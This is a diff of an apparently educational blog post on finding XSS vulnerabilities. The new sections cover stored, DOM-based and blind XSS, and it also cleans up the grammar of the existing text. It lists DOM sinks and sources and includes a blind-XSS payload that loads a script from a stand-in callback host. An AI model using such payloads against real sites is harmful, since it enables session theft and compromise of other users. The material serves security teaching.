@@ -3,7 +3,7 @@ export const meta = {
       date: '2026-07-05',
       tags: ['web-security', 'pentesting', 'xss'],
       excerpt:
-            'Since I have written the blogs on how to learn Web pentesting, this time im gonna write a series of blogs covering every web vulnerability starting with XSS.',
+            'Since I have already written blogs on learning web pentesting, this time I am writing a series covering major web vulnerabilities, starting with XSS.',
       slug: 'xss',
       searchText:
             'cross site scripting xss reflected stored dom blind pentesting methodology context mapping HTML body attribute script tag url template expression bypass csp',
@@ -50,15 +50,15 @@ export function MiniCard({ title, children }) {
       )
 }
 
-Since I have written the blogs on how to learn Web pentesting, this time im gonna write a series of blogs covering every web vulnerability starting with XSS.
+Since I have written blogs on learning web pentesting, this time I am going to write a series covering every major web vulnerability, starting with XSS.
 
 <div style={styles.lead}>
       <strong>Core idea:</strong> As you may have read in reconnaissance, the
-      first step is always contextual mapping even before we go towards payload
+      first step is always contextual mapping even before we move toward payload
       writing.
 </div>
 
-There are many sub categories of XSS i.e. Reflected, Stored, DOM and Blind.
+There are many subcategories of XSS, i.e. Reflected, Stored, DOM-based, and Blind.
 
 <div style={styles.grid}>
       <MiniCard title="Reflected XSS">
@@ -144,6 +144,93 @@ We use template expression syntax:
 <div style={styles.flow}>
       <strong>Mistakes You might make:</strong>
       <div style={{ marginTop: '0.4rem' }}>
-            Copy pasting a generic payload <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> everywhere as it only works for raw HTML body, it will fail everywhere else and you will never find out why so.
+            Copy-pasting a generic payload <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> everywhere. It only works for raw HTML body context, fails in most other contexts, and you may not understand why.
       </div>
 </div>
+
+---
+
+## Stored XSS
+
+<div style={styles.lead}>
+      <strong>First Step:</strong> Find where user input is submitted (for
+      example comments, profile filename, bio, or username) and then identify
+      where that same data is displayed after submission.
+</div>
+
+Create a unique marker first, then check every place where that data may appear:
+admin views, email notifications, API responses, search snippets, and RSS feeds.
+
+Once you find the rendering location, repeat the same context-mapping process as
+Reflected XSS. Also verify whether it renders only for you or for other users,
+because multi-user impact is generally more severe.
+
+<div style={styles.flow}>
+      <strong>Mistakes You might make:</strong>
+      <div style={{ marginTop: '0.4rem' }}>
+            Only checking the page where you submitted the input. Stored payloads
+            often execute in other pages and workflows.
+      </div>
+</div>
+
+---
+
+## DOM-based XSS
+
+<div style={styles.lead}>
+      <strong>First Step:</strong> Search JavaScript source files for dangerous
+      sinks and then trace the data flow backward.
+</div>
+
+Common sinks include:
+
+```text
+innerHTML, outerHTML, document.write, eval, setTimeout, setInterval,
+insertAdjacentHTML, script.src, iframe.src, and jQuery html()/append()
+```
+
+For each sink, trace backward to identify which variable feeds it.
+
+Then trace that variable to user-controlled sources such as:
+
+```text
+location.hash, location.search, document.referrer, postMessage data,
+window.name, localStorage, sessionStorage
+```
+
+After finding the sink-source path, build payloads that match how that specific
+sink interprets input.
+
+Test in the browser directly (address bar and DevTools), because DOM XSS often
+does not reach the server.
+
+<div style={styles.flow}>
+      <strong>Mistakes You might make:</strong>
+      <div style={{ marginTop: '0.4rem' }}>
+            Treating DOM XSS exactly like Reflected XSS and testing only through
+            HTTP requests. Many DOM sinks never hit the server, so proxy-only
+            testing can miss the issue.
+      </div>
+</div>
+
+---
+
+## Blind XSS
+
+<div style={styles.lead}>
+      <strong>First Step:</strong> Use a callback endpoint because execution may
+      happen later in another application (often an admin panel).
+</div>
+
+Set up a callback server (for example Burp Collaborator or Interactsh), then
+submit payloads in fields with no immediate output, such as contact forms,
+support tickets, password reset notes, or internal log viewers.
+
+Example callback payload:
+
+```html
+<script src="https://your-server.com/xss.js"></script>
+```
+
+Blind XSS requires patience. Triggers can happen minutes, hours, or even days
+later when another user (often admin/support) views the stored data.
